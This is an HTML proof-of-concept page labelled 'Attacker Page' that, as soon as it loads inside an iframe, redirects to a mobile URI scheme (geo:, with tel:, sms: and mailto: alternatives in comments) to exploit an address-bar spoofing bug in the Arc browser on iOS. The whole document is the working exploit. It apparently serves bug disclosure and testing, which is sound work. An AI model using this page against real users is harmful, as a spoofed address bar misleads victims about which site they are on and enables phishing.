<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Attacker iframe: triggers mobile URI scheme</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body { font-family: -apple-system, system-ui, Segoe UI, Roboto, Helvetica, Arial, sans-serif; padding: 16px; }
    .note { padding: 12px 16px; background: #fff8e1; border: 1px solid #ffecb3; border-radius: 12px; }
  </style>
  <script>
    // Choose ONE of the payloads below. geo: is default and generally noiseless.
    function trigger() {
      try {
        // Primary PoC
        location.href = "geo:37.7749,-122.4194?q=Free+WiFi+Spot";
        
        // Alternative payloads if needed:
        // location.href = "tel:+15551234567";
        // location.href = "sms:+15551234567?body=hello";
        // location.href = "mailto:test@example.com?subject=hello";
      } catch (e) {
        console.log("Redirect failed:", e);
      }
    }
    // Fire as soon as the iframe document is interactive/visible.
    document.addEventListener("DOMContentLoaded", trigger);
  </script>
</head>
<body>
  <div class="note">
    <strong>Attacker Page</strong>: This iframe immediately redirects to a mobile URI scheme (e.g., <code>geo:</code>).<br>
    If the Arc iOS bug is present, the parent tab's address bar may show this origin even while the top-level victim page remains visible.
  </div>
</body>
</html>
